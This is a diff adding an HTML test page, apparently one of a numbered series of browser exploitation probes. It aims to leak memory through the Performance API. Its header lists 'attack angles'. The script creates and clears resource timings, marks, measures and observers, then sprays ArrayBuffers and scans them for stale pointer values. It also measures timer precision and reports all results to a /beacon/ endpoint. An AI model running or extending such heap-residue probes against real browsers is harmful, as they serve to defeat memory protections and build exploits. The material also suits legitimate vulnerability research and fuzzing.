@@ -1,0 +1,371 @@
+<!--
+  p776: Performance API / Resource Timing / PerformanceObserver residue oracle
+
+  The Performance API maintains an internal timeline buffer of
+  PerformanceEntry objects (PerformanceResourceTiming, PerformanceMark,
+  PerformanceMeasure, PerformanceNavigationTiming). These C++ objects
+  contain URL strings, high-resolution timestamps, and internal state.
+
+  Key insight: performance.clearResourceTimings() frees all accumulated
+  resource timing entries. Each entry is a C++ PerformanceResourceTiming
+  object (~100-200 bytes) containing the request URL, timing breakdown
+  (DNS, connect, TLS, TTFB, response), transfer size, and initiator
+  type. Clearing many entries at once frees a batch of same-size objects.
+
+  Additionally: PerformanceObserver registers a C++ callback wrapper
+  that receives batched entry notifications. Creating and disconnecting
+  many observers exercises the observer list management.
+
+  performance.mark() and performance.measure() create user-defined
+  entries with string names stored in C++ backing. Creating many marks
+  with long names and then clearing them frees string + entry pairs.
+
+  The Navigation Timing Level 2 API (performance.getEntriesByType
+  ('navigation')) returns a single entry with detailed page load timing.
+  Its internal structure may differ from resource entries.
+
+  Attack angles:
+  A) Bulk resource timing entry accumulation then clearResourceTimings + spray.
+  B) performance.mark/measure with long names then clearMarks/clearMeasures.
+  C) PerformanceObserver create/disconnect churn.
+  D) Resource timing buffer overflow (setResourceTimingBufferSize) event.
+  E) High-resolution timestamp precision measurement.
+  F) performance.getEntries() object property enumeration for hidden fields.
+
+  CRASH_CLASS: LOW (performance API, XHR for timing entries, no side effects)
+  prior art: p630 (performance.now() quantized, navigation timing zeroed),
+  p772 (Fetch API)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p776</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+
+window.onload=function(){
+b('p776-START');
+
+// === Section A: Resource timing entry accumulation then clear + spray ===
+try{
+  b('A-resource-timing');
+  var aHits=0;
+
+  for(var round=0;round<3;round++){
+    for(var i=0;i<50;i++){
+      try{
+        var x=new XMLHttpRequest();
+        x.open('GET','/beacon/rt_'+round+'_'+i+'_'+'p'.repeat(50),false);
+        x.send();
+      }catch(e){}
+    }
+
+    var entries=performance.getEntriesByType('resource');
+    if(round===0){
+      b('A resource_entries='+entries.length);
+      if(entries.length>0){
+        var e=entries[entries.length-1];
+        var props=[];
+        for(var k in e){
+          if(typeof e[k]!=='function')props.push(k);
+        }
+        b('A entry_props='+props.join(','));
+        b('A entry_name='+e.name.substring(0,60));
+        b('A startTime='+e.startTime.toFixed(2)+' duration='+e.duration.toFixed(2));
+        b('A transferSize='+e.transferSize+' encodedBodySize='+e.encodedBodySize);
+      }
+    }
+
+    performance.clearResourceTimings();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+    var SIZES=[96,128,192,256];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('A-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      aHits+=szHits;
+    }
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: Mark/Measure with long names then clear ===
+try{
+  b('B-mark-measure');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    for(var i=0;i<200;i++){
+      var markName='mark_'+round+'_'+i+'_'+'m'.repeat(40+i%30);
+      performance.mark(markName);
+    }
+
+    var marks=performance.getEntriesByType('mark');
+    if(round===0)b('B marks_created='+marks.length);
+
+    for(var i=0;i<100;i++){
+      var startMark='mark_'+round+'_'+(i*2)+'_'+'m'.repeat(40+(i*2)%30);
+      var endMark='mark_'+round+'_'+(i*2+1)+'_'+'m'.repeat(40+(i*2+1)%30);
+      try{
+        performance.measure('measure_'+round+'_'+i+'_'+'x'.repeat(30), startMark, endMark);
+      }catch(e){}
+    }
+
+    var measures=performance.getEntriesByType('measure');
+    if(round===0)b('B measures_created='+measures.length);
+
+    performance.clearMarks();
+    performance.clearMeasures();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var SIZES=[64,96,128];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('B-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      bHits+=szHits;
+    }
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: PerformanceObserver create/disconnect churn ===
+try{
+  b('C-observer-churn');
+  var cHits=0;
+  var observerSupported=typeof PerformanceObserver!=='undefined';
+
+  if(!observerSupported){
+    b('C-SKIP no PerformanceObserver');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var observers=[];
+        for(var i=0;i<50;i++){
+          var callCount=0;
+          var obs=new PerformanceObserver(function(list){
+            callCount+=list.getEntries().length;
+          });
+          try{
+            obs.observe({entryTypes:['mark']});
+          }catch(e){
+            if(i===0 && round===0)b('C observe_err='+e.message);
+          }
+          observers.push(obs);
+        }
+
+        for(var i=0;i<20;i++){
+          performance.mark('obs_trigger_'+round+'_'+i);
+        }
+        performance.clearMarks();
+
+        for(var i=0;i<observers.length;i++){
+          observers[i].disconnect();
+        }
+        observers=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(96);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=96;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('C-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      cHits+=szHits;
+    }
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: Resource timing buffer overflow event ===
+try{
+  b('D-buffer-overflow');
+
+  var overflowFired=0;
+  performance.onresourcetimingbufferfull=function(){
+    overflowFired++;
+  };
+
+  try{
+    performance.setResourceTimingBufferSize(10);
+  }catch(e){
+    b('D setBufferSize_err='+e.message);
+  }
+
+  for(var i=0;i<30;i++){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/beacon/overflow_'+i,false);
+      x.send();
+    }catch(e){}
+  }
+
+  b('D overflow_events='+overflowFired);
+  var entries=performance.getEntriesByType('resource');
+  b('D entries_after_overflow='+entries.length);
+
+  performance.setResourceTimingBufferSize(250);
+  performance.clearResourceTimings();
+  performance.onresourcetimingbufferfull=null;
+
+  b('D-DONE');
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: High-resolution timestamp precision ===
+try{
+  b('E-timestamp-precision');
+
+  var timestamps=[];
+  for(var i=0;i<1000;i++){
+    timestamps.push(performance.now());
+  }
+
+  var deltas=[];
+  var zeroDeltaCount=0;
+  for(var i=1;i<timestamps.length;i++){
+    var d=timestamps[i]-timestamps[i-1];
+    if(d>0)deltas.push(d);
+    else zeroDeltaCount++;
+  }
+
+  b('E samples=1000 zero_deltas='+zeroDeltaCount+' nonzero='+deltas.length);
+
+  if(deltas.length>0){
+    deltas.sort(function(a,b){return a-b;});
+    b('E min_delta='+deltas[0].toFixed(6)+'ms');
+    b('E median_delta='+deltas[Math.floor(deltas.length/2)].toFixed(6)+'ms');
+    b('E max_delta='+deltas[deltas.length-1].toFixed(6)+'ms');
+
+    var uniqueDeltas={};
+    for(var i=0;i<Math.min(100,deltas.length);i++){
+      var key=deltas[i].toFixed(6);
+      uniqueDeltas[key]=(uniqueDeltas[key]||0)+1;
+    }
+    var top=[];
+    for(var k in uniqueDeltas)top.push({v:k,c:uniqueDeltas[k]});
+    top.sort(function(a,b){return b.c-a.c;});
+    var topStr=[];
+    for(var i=0;i<Math.min(5,top.length);i++)topStr.push(top[i].v+'(x'+top[i].c+')');
+    b('E top_deltas='+topStr.join(' '));
+  }
+
+  var navEntries=performance.getEntriesByType('navigation');
+  if(navEntries.length>0){
+    var nav=navEntries[0];
+    b('E nav_startTime='+nav.startTime+' responseEnd='+nav.responseEnd+' domComplete='+nav.domComplete);
+    b('E nav_type='+nav.type+' transferSize='+nav.transferSize);
+  }else{
+    b('E nav_entries=0');
+    var t=performance.timing;
+    if(t){
+      b('E timing_navigationStart='+t.navigationStart+' loadEventEnd='+t.loadEventEnd);
+      b('E timing_domComplete='+t.domComplete);
+    }
+  }
+
+  b('E-DONE');
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: getEntries() object property enumeration ===
+try{
+  b('F-property-enum');
+
+  for(var i=0;i<5;i++){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/beacon/enum_'+i,false);
+      x.send();
+    }catch(e){}
+  }
+
+  var allEntries=performance.getEntries();
+  b('F total_entries='+allEntries.length);
+
+  var typeMap={};
+  for(var i=0;i<allEntries.length;i++){
+    var t=allEntries[i].entryType;
+    typeMap[t]=(typeMap[t]||0)+1;
+  }
+  var typeStr=[];
+  for(var k in typeMap)typeStr.push(k+'='+typeMap[k]);
+  b('F entry_types='+typeStr.join(','));
+
+  if(allEntries.length>0){
+    var entry=allEntries[allEntries.length-1];
+    var allProps=Object.getOwnPropertyNames(entry);
+    b('F own_props='+allProps.join(','));
+
+    var protoProps=[];
+    var proto=Object.getPrototypeOf(entry);
+    while(proto && proto!==Object.prototype){
+      var pp=Object.getOwnPropertyNames(proto);
+      for(var i=0;i<pp.length;i++){
+        if(protoProps.indexOf(pp[i])===-1)protoProps.push(pp[i]);
+      }
+      proto=Object.getPrototypeOf(proto);
+    }
+    b('F proto_props_count='+protoProps.length);
+    if(protoProps.length<=30)b('F proto_props='+protoProps.join(','));
+
+    try{
+      var json=entry.toJSON();
+      var jsonKeys=Object.keys(json);
+      b('F toJSON_keys='+jsonKeys.join(','));
+
+      var numericValues=[];
+      for(var i=0;i<jsonKeys.length;i++){
+        var v=json[jsonKeys[i]];
+        if(typeof v==='number' && v!==0){
+          numericValues.push(jsonKeys[i]+'='+v);
+        }
+      }
+      b('F nonzero_numeric='+numericValues.join(','));
+    }catch(e){
+      b('F toJSON_err='+e.message);
+    }
+  }
+
+  performance.clearResourceTimings();
+  b('F-DONE');
+}catch(e){b('F-ERR '+e.message);}
+
+b('p776-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
